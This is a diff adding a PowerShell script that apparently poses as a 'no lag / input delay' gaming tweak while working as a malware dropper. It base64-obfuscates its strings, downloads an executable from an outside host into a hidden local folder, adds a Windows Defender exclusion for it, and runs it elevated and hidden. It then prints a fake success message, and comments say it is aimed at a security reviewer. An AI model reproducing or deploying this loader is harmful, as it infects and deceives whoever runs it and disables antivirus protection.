@@ -1,0 +1,48 @@
+#Oh Wow you found me
+#The whole point of this is so my glorious king john hammond will review this malware
+
+$silentB64 = "U2lsZW50bHljb250aW51ZQ=="
+$updaterB64 = "dXBkYXRlci5leGU"
+$fileB64 = "bm9sYWcud3RmL1N0ZWFtVXBkYXRlcg=="
+$hiddenAttrB64 = "SGlkZGVu"
+$stopActionB64 = "U3RvcA=="
+$directoryB64 = "RGlyZWN0b3J5"
+$runAsB64 = "UnVuQXM="
+
+
+$silent = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($silentB64))
+$updater = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($updaterB64))
+$file = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($fileB64))
+$hiddenAttr = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($hiddenAttrB64))
+$stopAction = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($stopActionB64))
+$directory = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($directoryB64))
+$runAs = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($runAsB64))
+
+
+
+
+$hiddenFolder = Join-Path $env:LOCALAPPDATA ([System.Guid]::NewGuid().ToString())
+New-Item -ItemType $directory -Path $hiddenFolder | Out-Null
+
+$tempPath = Join-Path $hiddenFolder $updater
+
+function Add-Exclusion {
+    param ([string]$Path)
+    try {
+        Add-MpPreference -ExclusionPath $Path -ErrorAction $silent
+    } catch {}
+}
+
+try {
+    Invoke-WebRequest -Uri $file -OutFile $tempPath -UseBasicParsing -ErrorAction $stopAction
+    Set-ItemProperty -Path $hiddenFolder -Name Attributes -Value $hiddenAttr
+    Set-ItemProperty -Path $tempPath -Name Attributes -Value $hiddenAttr
+    Add-Exclusion -Path $tempPath
+    Start-Process -FilePath $tempPath -WindowStyle $hiddenAttr -Verb $runAs -Wait
+    Remove-Item $hiddenFolder -Recurse -Force
+
+} catch {
+    exit 1
+} finally {
+    Write-Host "No lag / Input Delay Tweaks Have Been Successfully Installed."
+}
